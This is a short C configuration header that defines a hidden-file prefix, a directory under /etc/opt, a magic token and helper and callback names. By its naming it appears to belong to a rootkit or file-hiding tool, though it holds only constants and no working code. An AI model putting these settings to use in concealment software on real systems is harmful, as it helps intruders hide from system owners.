#ifndef _CONFIG_H
#define _CONFIG_H

#ifndef SHINI_PREFIX
#define SHINI_PREFIX "._w00t1_"
#define SHINI_PREFIX_LEN 10
#endif

#ifndef SHINI_DIR
#define SHINI_DIR "/etc/opt/" SHINI_PREFIX "/"
#endif

#ifndef SHINI_TOKEN
#define SHINI_TOKEN 0xdeadbeef
#endif

#ifndef SHINI_HELPER
#define SHINI_HELPER SHINI_DIR SHINI_PREFIX "helper\0"
#endif

#ifndef SHINI_CB
#define SHINI_CB SHINI_PREFIX "cb\0"
#endif

#endif // _CONFIG_H

